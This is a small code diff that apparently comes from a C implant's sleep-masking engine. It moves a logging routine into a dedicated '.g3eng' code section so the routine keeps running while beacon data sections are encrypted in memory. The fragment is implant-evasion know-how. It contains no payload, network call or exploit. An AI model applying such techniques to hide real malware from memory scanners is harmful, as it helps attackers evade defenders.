@@ -156,6 +156,7 @@ void g3_log(const char * msg, long v)
  * frame (no .rdata literals), file ops come from the caller's G3_IO copy
  * (stack), so nothing here touches beacon .data/.rdata while they are
  * ciphertext. Format: "<tag> <a-decimal> <b-hex16> <c-hex16>". */
+#pragma code_seg(".g3eng")
 static void g3_log_n(const G3_IO * io, char tag, unsigned int a, unsigned long long b, unsigned long long c)
 {
 	char buf[64];
@@ -222,6 +223,7 @@ static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
 /* Snapshot of the block list, taken before any region is touched: masking
  * .data corrupts gparms (which points into .data) and the heap_records
  * array (in .bss) mid-walk, so the walk itself must run off local copies. */
+#pragma code_seg()
 static int g3_snapshot_blocks(G3_BLOCK * out, int max, DWORD * text_span)
 {
 	GARGLEP parms = *gparms;
